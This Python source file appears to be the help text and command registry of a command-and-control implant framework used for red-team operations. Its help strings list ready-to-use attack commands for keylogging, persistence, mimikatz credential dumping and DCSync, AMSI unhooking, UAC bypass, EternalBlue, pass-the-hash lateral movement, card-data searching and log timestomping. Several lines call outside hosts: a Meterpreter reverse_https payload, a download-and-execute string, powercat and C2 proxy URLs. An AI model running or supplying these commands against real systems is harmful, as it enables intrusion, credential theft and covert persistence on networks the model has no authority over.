#!/usr/bin/python

py_help1 = """
Implant Features:
=====================
ps
startanotherimplant or sai
startanotherimplant-keepfile
beacon 60s / beacon 10m / beacon 2h
python print "This is a test"
loadmodule
loadmoduleforce
get-keystrokes
upload-file
download-file
install-persistence
remove-persistence
get-screenshot
setbeacon
kill-implant
hide-implant
unhide-implant
help
searchhelp mimikatz
back
"""

posh_help1 = """
Implant Features:
=====================
ps
searchhelp mimikatz
beacon 60s / beacon 10m / beacon 2h
turtle 60s / turtle 30m / turtle 8h
kill-implant
hide-implant
unhide-implant
invoke-enum
get-proxy
get-computerinfo
unzip <source file> <destination folder>
get-system
get-system-withproxy
get-system-withdaisy
get-implantworkingdirectory
get-pid
posh-delete c:\\temp\\svc.exe
get-webpage http://intranet
listmodules
modulesloaded
loadmodule <modulename>
loadmodule inveigh.ps1
loadmoduleforce inveigh.ps1
get-userinfo
invoke-hostenum -all
find-allvulns
invoke-expression (get-webclient).downloadstring("https://module.ps1")
startanotherimplant or sai
invoke-daisychain -daisyserver http://192.168.1.1 -port 80 -c2port 80 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\\test -proxypassword pass -localhost (optional if low level user)
createproxypayload -user <dom\\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>
get-mshotfixes
get-firewallrulesall | out-string -width 200
enablerdp
disablerdp
netsh.exe advfirewall firewall add rule name="enablerdp" dir=in action=allow protocol=tcp localport=any enable=yes
get-wlanpass
get-wmiobject -class win32_product
get-creditcarddata -path 'c:\\backup\\'
timestomp c:\\windows\\system32\\service.exe "01/03/2008 12:12 pm"
icacls c:\\windows\\system32\\resetpassword.exe /grant administrator:f
get-allfirewallrules c:\\temp\\rules.csv
get-allservices
get-wmireglastloggedon
get-wmiregcachedrdpconnection
get-wmiregmounteddrive
resolve-ipaddress
unhook-amsi
get-process -id $pid -module |%{ if ($_.modulename -eq "amsi.dll") {echo "`nAMSI Loaded`n"} }
get-wmiObject -class win32_product
"""

posh_help2 = """
Privilege Escalation:
====================
invoke-allchecks
Invoke-PsUACme -Payload "c:\\temp\\uac.exe" -method sysprep 
get-mshotfixes | where-object {$_.hotfixid -eq "kb2852386"}
invoke-ms16-032
invoke-ms16-032-proxypayload
invoke-eternalblue -target 127.0.0.1  -initialgrooms 5 -maxattempts 1 -msfbind
get-gpppassword
get-content 'c:\\programdata\\mcafee\\common framework\\sitelist.xml'
dir -recurse | select-string -pattern 'password='
"""

posh_help3 = """
File Management:
====================
download-file -source 'c:\\temp dir\\run.exe'
download-files -directory 'c:\\temp dir\\'
upload-file -source 'c:\\temp\\run.exe' -destination 'c:\\temp\\test.exe'
web-upload-file -from 'http://www.example.com/app.exe' -to 'c:\\temp\\app.exe'

Persistence:
================
install-persistence 1,2,3
remove-persistence 1,2,3
installexe-persistence
removeexe-persistence
install-servicelevel-persistence | remove-servicelevel-persistence
install-servicelevel-persistencewithproxy | remove-servicelevel-persistence
invoke-wmievent -name backup -command "powershell -enc abc" -hour 10 -minute 30
get-wmievent
remove-wmievent -name backup

Network Tasks / Lateral Movement:
==================
get-externalip
test-adcredential -domain test -user ben -password password1
invoke-smblogin -target 192.168.100.20 -domain testdomain -username test -hash/-password
invoke-smbclient -Action Put -source c:\\temp\\test.doc -destination \\test.com\\c$\\temp\\test.doc -hash
invoke-smbexec -target 192.168.100.20 -domain testdomain -username test -hash/-pass -command "net user smbexec winter2017 /add"
invoke-wmiexec -target 192.168.100.20 -domain testdomain -username test -hash/-pass -command "net user smbexec winter2017 /add"
net view | net users | net localgroup administrators | net accounts /dom
whoami /groups | whoami /priv
"""

posh_help4 = """
Active Directory Enumeration:
==================
invoke-aclscanner
get-objectacl -resolveguids -samaccountname john
add-objectacl -targetsamaccountname arobbins -principalsamaccountname harmj0y -rights resetpassword
get-netuser -admincount | select samaccountname
get-domainuser -uacfilter not_password_expired,not_accountdisable -properties samaccountname,pwdlastset | export-csv act.csv
get-netgroup -admincount | select samaccountname
get-netgroupmember "domain admins" -recurse|select membername
get-netcomputer | select-string -pattern "citrix"
get-netcomputer -filter operatingsystem=*7*|select name
get-netcomputer -filter operatingsystem=*2008*|select name
get-domaincomputer -ldapfilter "(|(operatingsystem=*7*)(operatingsystem=*2008*))" -spn "wsman*" -properties dnshostname,serviceprincipalname,operatingsystem,distinguishedname | fl
get-netgroup | select-string -pattern "internet"
get-netuser -filter | select-object samaccountname,userprincipalname
get-netuser -filter samaccountname=test
get-netuser -filter userprinciplename=test@test.com
get-netgroup | select samaccountname
get-netgroup "*ben*" | select samaccountname
get-netgroupmember "domain admins" -recurse|select membername
get-netshare hostname
invoke-sharefinder -verbose -checkshareaccess
new-psdrive -name "p" -psprovider "filesystem" -root "\\\\bloredc1\\netlogon"

Domain Trusts:
==================
get-netdomain | get-netdomaincontroller | get-netforestdomain
get-netforest | get-netforesttrust
invoke-mapdomaintrust
get-netuser -domain child.parent.com -filter samaccountname=test
get-netgroup -domain child.parent.com | select samaccountname
"""

posh_help5 = """
Domain / Network Tasks:
==================
invoke-bloodhound -collectionmethod 'stealth' -csvfolder c:\\temp\\
get-netdomaincontroller | select name | get-netsession | select *username,*cname
get-dfsshare | get-netsession | select *username,*cname
get-netfileserver | get-netsession | select *username,*cname
invoke-kerberoast -outputformat hashcat|select-object -expandproperty hash
write-scffile -ipaddress 127.0.0.1 -location \\\\localhost\\c$\\temp\\
write-inifile -ipaddress 127.0.0.1 -location \\\\localhost\\c$\\temp\\
get-netgroup | select-string -pattern "internet"
invoke-hostscan -iprangecidr 172.16.0.0/24 (provides list of hosts with 445 open)
get-netfileserver -domain testdomain.com
find-interestingfile -path \\\\server\\share -officedocs -lastaccesstime (get-date).adddays(-7)
brute-ad
brute-locadmin -username administrator
get-passpol
get-passnotexp
get-locadm
invoke-inveigh -http y -proxy y -nbns y -tool 1 -StartupChecks y
get-inveigh | stop-inveigh (gets output from inveigh thread)
invoke-sniffer -outputfile c:\\temp\\output.txt -maxsize 50mb -localip 10.10.10.10
invoke-sqlquery -sqlserver 10.0.0.1 -user sa -pass sa -query 'select @@version'
invoke-runas -user <user> -password '<pass>' -domain <dom> -command c:\\windows\\system32\\cmd.exe -args " /c calc.exe"
invoke-pipekat -target <ip-optional> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional>
invoke-wmiexec -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional> -command <cmd>
"""

posh_help6 = """
Lateral Movement:
=========================================================
invoke-runaspayload -user <user> -password '<pass>' -domain <dom>
invoke-runasproxypayload -user <user> -password '<pass>' -domain <dom>
invoke-runasdaisypayload -user <user> -password '<pass>' -domain <dom>
invoke-dcompayload -target <ip>
invoke-dcomproxypayload -target <ip>
invoke-dcomdaisypayload -target <ip>
invoke-psexecpayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional>
invoke-psexecproxypayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional>
invoke-psexecdaisypayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional>
invoke-wmipayload -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional>
invoke-wmiproxypayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional>
invoke-wmidaisypayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
invoke-winrmsession -ipaddress <ip> -user <dom\\user> -pass <pass>
"""

posh_help7 = """
Credentials / Tokens / Local Hashes (Must be SYSTEM):
=========================================================
invoke-mimikatz | out-string | parse-mimikatz
invoke-mimikatz -command '"sekurlsa::logonpasswords"'
invoke-mimikatz -command '"lsadump::sam"'
invoke-mimikatz -command '"lsadump::lsa"'
invoke-mimikatz -command '"lsadump::cache"'
invoke-mimikatz -command '"lsadump::secrets"'
invoke-mimikatz -command '"ts::multirdp"'
invoke-mimikatz -command '"privilege::debug"'
invoke-mimikatz -command '"crypto::capi"'
invoke-mimikatz -command '"crypto::certificates /export"'
invoke-mimikatz -command '"sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<hash> /run:c:\\temp\\run.bat"'
invoke-mimikatz -computer 10.0.0.1 -command '"sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<hash> /run:c:\\temp\\run.bat"'
invoke-tokenmanipulation | select-object domain, username, processid, iselevated, tokentype | ft -autosize | out-string
invoke-tokenmanipulation -impersonateuser -username "domain\\user"
get-lapspasswords

Credentials / Domain Controller Hashes:
============================================
invoke-mimikatz -command '"lsadump::dcsync /domain:domain.local /user:administrator"'
invoke-dcsync -pwdumpformat
dump-ntds -emptyfolder <emptyfolderpath>
"""

posh_help8 = """
Useful Modules:
====================
get-screenshot
get-screenshotallwindows
get-screenshotmulti -timedelay 120 -quantity 30
get-recentfiles
cred-popper
get-clipboard
hashdump
get-keystrokes
get-keystrokedata
arpscan -ipcidr 10.0.0.1/24
portscan -ipaddress 10.0.0.1-50 -ports "1-65535" -maxqueriesps 10000 -delay 0
((new-object Net.Sockets.TcpClient).connect("10.0.0.1",445))
migrate
migrate -procid 4444
migrate -procpath c:\\windows\\system32\\searchprotocolhost.exe -suspended -RtlCreateUserThread
migrate -procpath c:\\windows\\system32\\svchost.exe -suspended
inject-shellcode -x86 -shellcode (gc c:\\temp\\shellcode.bin -encoding byte) -procid 5634
invoke-shellcode -payload windows/meterpreter/reverse_https -lhost 172.16.0.100 -lport 443 -force
get-eventlog -newest 10000 -instanceid 4624 -logname security | select message -expandproperty message | select-string -pattern "user1|user2|user3"
send-mailmessage -to "itdept@test.com" -from "user01 <user01@example.com>" -subject <> -smtpserver <> -attachment <>
sharpsocks -uri http://www.c2.com:9090 -beacon 2000 -insecure
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow program="C:\windows\system32\svchost.exe" protocol=TCP localport=80 profile=Domain
$socket = new-object System.Net.Sockets.TcpListener('0.0.0.0', 1080);$socket.start();
reversedns 10.0.0.1
powercat -c 172.0.0.1 -p 8080 -d
[System.Net.Dns]::GetHostbyAddress("10.0.0.1")

Implant Handler:
=====================
searchhelp
back
quit
exit
"""


pre_help = """
Main Menu: 
================================
use implant by <id>, e.g. 1
use multiple implants by <id>,<id>,<id>, e.g. 1,2,5
use implant by range, e.g. 40-45
use all implants by all

Auto-Runs: 
=====================
add-autorun <task>
list-autorun (alias: l)
del-autorun <taskid>
nuke-autorun
automigrate-frompowershell (alias: am)

Server Commands: 
=====================
tasks
opsec
show-urls
list-urls
cleartasks
show-serverinfo 
history
output-to-html
set-clockworksmsapikey df2
set-clockworksmsnumber 44789
set-defaultbeacon 60
turnon-notifications
turnoff-notifications
listmodules 
pwnself (alias: p)
creds -action <dump/add/del/search> -username <username> -password/-hash 
createnewpayload
createproxypayload 
createdaisypayload
quit 
"""

posh_help = posh_help1 + posh_help2 + posh_help3 + posh_help4 + posh_help5 + posh_help6 + posh_help7 + posh_help8


# pre help commands
PRECOMMANDS = ['list-urls','show-urls', 'add-autorun' ,'list-autorun','del-autorun', 'nuke-autorun','automigrate-frompowershell',
'show-serverinfo','history','output-to-html','set-clockworksmsapikey','set-clockworksmsnumber','set-defaultbeacon',
'listmodules','pwnself','creds','createnewpayload','createproxypayload','listmodules',
'createdaisypayload','turnoff-notifications','turnon-notifications','tasks','cleartasks',"opsec"]

# post help commands
COMMANDS = ['loadmodule',"bloodhound","brute-ad","brute-locadmin",
"bypass-uac","cve-2016-9192","convertto-shellcode","decrypt-rdcman","dump-ntds","get-computerinfo","get-creditcarddata","get-gppautologon",
"get-gpppassword","get-idletime","get-keystrokes","get-locadm","get-mshotfixes","get-netstat","get-passnotexp","get-passpol","get-recentfiles",
"get-serviceperms","get-userinfo","get-wlanpass","invoke-hostenum","inject-shellcode","inveigh-relay","inveigh","invoke-arpscan","arpscan",
"invoke-dcsync","invoke-eventvwrbypass","invoke-hostscan","invoke-ms16-032-proxy","invoke-ms16-032","invoke-mimikatz","invoke-psinject",
"invoke-pipekat","invoke-portscan","invoke-powerdump","invoke-psexec","invoke-reflectivepeinjection","invoke-reversednslookup",
"invoke-runas","invoke-smbexec","invoke-shellcode","invoke-sniffer","invoke-sqlquery","invoke-tater","invoke-thehash",
"invoke-tokenmanipulation","invoke-wmichecker","invoke-wmicommand","invoke-wmiexec","invoke-wscriptbypassuac","invoke-winrmsession",
"out-minidump","portscan","invoke-allchecks","set-lhstokenprivilege","sharpsocks","find-allvulns","test-adcredential","new-zipfile",
"get-netuser","sleep","beacon","setbeacon","get-screenshot", "install-persistence","hide-implant","unhide-implant","kill-implant","invoke-runasdaisypayload", 
"invoke-runasproxypayload", "invoke-runaspayload","migrate","$psversiontable","back", "clear","invoke-daisychain","stop-daisy",
"ipconfig","upload-file","download-file","download-files","history","get-help","stopsocks","get-screenshotallwindows",
"hashdump","cred-popper","help","whoami","createnewpayload","createproxypayload","createdaisypayload",
"get-proxy","restart-computer","turtle","posh-delete","get-idletime","get-psdrive",
"get-netcomputer","get-netdomain","get-netforest","get-netforesttrust","get-forestdomain",
"test-connection","get-netdomaincontroller","invoke-pbind","pbind-command",
"invoke-kerberoast","invoke-userhunter","get-process","start-process",
"searchhelp","get-netshare","pbind-kill","install-servicelevel-persistencewithproxy",
"install-servicelevel-persistence","remove-servicelevel-persistence","reversedns",
"invoke-eternalblue","loadmoduleforce","unhook-amsi","get-implantworkingdirectory","get-system",
"get-system-withproxy","get-system-withdaisy","get-pid","listmodules","modulesloaded",
"startanotherimplant","remove-persistence","removeexe-persistence","installexe-persistence",
"resolve-ipaddress","invoke-wmievent","remove-wmievent","get-wmievent","invoke-smbclient"]

COMMANDS += ['invoke-psexecpayload','invoke-wmipayload', 'invoke-dcompayload']
COMMANDS += ['invoke-psexecproxypayload','invoke-wmiproxypayload', 'invoke-dcomproxypayload']
COMMANDS += ['invoke-psexecdaisypayload','invoke-wmidaisypayload', 'invoke-dcomdaisypayload']

UXCOMMANDS = ["unhide-implant","hide-implant","help","searchhelp","python","loadmodule","loadmoduleforce","get-keystrokes","back","upload-file","download-file","install-persistence","remove-persistence","sai","startanotherimplant-keepfile","get-screenshot","startanotherimplant","pwd","id","ps","setbeacon","kill-implant"]